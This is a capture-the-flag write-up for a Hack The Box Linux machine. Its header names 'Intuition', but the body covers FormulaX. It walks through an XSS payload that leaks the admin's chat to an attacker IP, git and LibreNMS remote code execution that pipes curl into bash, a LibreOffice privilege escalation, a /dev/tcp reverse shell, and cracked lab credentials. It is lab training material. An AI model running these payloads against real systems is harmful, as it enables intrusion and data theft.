---
name: Intuition
difficulty: Hard
os: Linux
thumbnail: https://labs.hackthebox.com/storage/avatars/464537cc0d3e9962fc598767bff7b1f1.png
active: true
---

# XSS

The page [http://formulax.htb/restricted/contact](http://formulax.htb/restricted/contact) is weak to XSS.

Heres the working payload, eval a decoded base64 string for multiline code.

```html
<img
  src="x"
  onerror="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwpzY3JpcHQub25sb2FkID0gZnVuY3Rpb24gKCkgewogIGNvbnN0IHJlcyA9IGF4aW9zLmdldCgiL3VzZXIvYXBpL2NoYXQiKTsKICBjb25zdCBzb2NrZXQgPSBpbygiLyIsIHsgd2l0aENyZWRlbnRpYWxzOiB0cnVlIH0pOwoKICBzb2NrZXQub24oIm1lc3NhZ2UiLCAobXlfbWVzc2FnZSkgPT4gewogICAgZmV0Y2goYGh0dHA6Ly8xMC4xMC4xNS42NDo4MDAwLyR7YnRvYShteV9tZXNzYWdlKX1gKTsKICB9KTsKCiAgc29ja2V0LmVtaXQoImNsaWVudF9tZXNzYWdlIiwgImhpc3RvcnkiKTsKfTsKc2NyaXB0LnNyYyA9ICIvc29ja2V0LmlvL3NvY2tldC5pby5qcyI7Cgpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7Cg=='))"
/>
```

Here we listen to the admin's web socket, homing phone any of the data.

```js
var script = document.createElement("script");
script.onload = function () {
  const res = axios.get("/user/api/chat");
  const socket = io("/", { withCredentials: true });

  socket.on("message", (my_message) => {
    fetch(`http://10.10.15.64:8000/${btoa(my_message)}`);
  });

  socket.emit("client_message", "history");
};
script.src = "/socket.io/socket.io.js";

document.head.appendChild(script);
```

We get a new domain: [http://dev-git-auto-update.chatbot.htb/](http://dev-git-auto-update.chatbot.htb/)

# Shell

The page has an input for a url.

If we enter anything we get an error `Error: Failed to Clone`

Google search `git clone rce`, find: [https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221)

`nc -lvnp 4444`
`ext::sh -c curl% http://10.10.15.64:8000/shell.sh|bash`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# Enumeration

While linpeas ran I downloaded the ~/ directory to look through the app code. It's running Mongodb, we can use mongo cli to look through it.

`use testing`
`db.users.find().pretty()`

We find hash we can crack.

`frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6:manchesterunited`

Username: `frank_dorky`
Password: `manchesterunited`

Port 3000 running LibreNMS, forward port:
`ssh -L 3000:localhost:3000 frank_dorky@formulax.htb`

https://community.librenms.org/t/adding-new-users-in-librenms/20654/12
We can create a user by running `/opt/librenms/adduser.php <user> <pass> 10`

Go to `/validate`, the web server needs to be at "Ok", add `127.0.0.1 librenms.com` to `/etc/hosts`.

Alert Template page has an RCE: https://www.sonarsource.com/blog/itc-s-a-snmp-trap-gaining-code-execution-on-librenms/

Add to `Template` section.

```bash
@php
  system("curl http://10.10.15.64:8001/shell.sh|bash");
@endphp
```

# Librenms Database

Same process as before, there's an .custom.env file which reveals the SQL credentials.

`mysql -u kay_relay -p`
`mychemicalformulaX`

If we look at the librenms db's user table, we find a hash for user admin (real-name Kai Relay).

```sh
+-------------+--------------------------------------------------------------+-------------+-------------------------+
| username    | password                                                     | realname    | email                   |
+-------------+--------------------------------------------------------------+-------------+-------------------------+
| frank_dorky | $2y$10$Z2qrkFGqkfGstbhbOg9xKedi68K8mTkLYB/RiVMzl.djqFjVT2xKm | Frank Dorky | frank_dorky@chatbot.htb |
| admin       | $2y$10$B4Q/M4KrAm/1Z1pw8SsAB.9LQupfXdwQZk/xkzKQDwJ.olvgs.nbq | Kai Relay   | admin@chatbot.htb       |
| cinder      | $2y$10$aQCCbsQiFej88804KAkDCO1TEhPJl/xpHpPmzQLC8dpz28ReBATdq |             |                         |
+-------------+--------------------------------------------------------------+-------------+-------------------------+
```

Just a waste of time anyway, ssh and db password are the same.

`ssh kay_relay@formulax.htb`
`mychemicalformulaX`

# Privilege Escalation

Running `sudo -l` we find:

```
User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
```

which looks like this:
`/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless`

Run `file /usr/bin/soffice` to find it's a symlink to libreoffice, `--calc` launches their spreadsheet software.
If it wasn't obvious enough, "FormulaX" hints towards exploiting spreadsheets.

It's not an actual formula injection like I was expecting, but here's a POC I found after some searching: https://www.exploit-db.com/exploits/46544

Change last line to:
`shell_execute.execute("/tmp/pwn.sh", '',1)`

Reverse shell at `/tmp/pwn.sh`:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.64/4444 0>&1
```

Once listening finally run:
`python3 libreofficeRCE.py --host localhost --port 2002`

Rooted
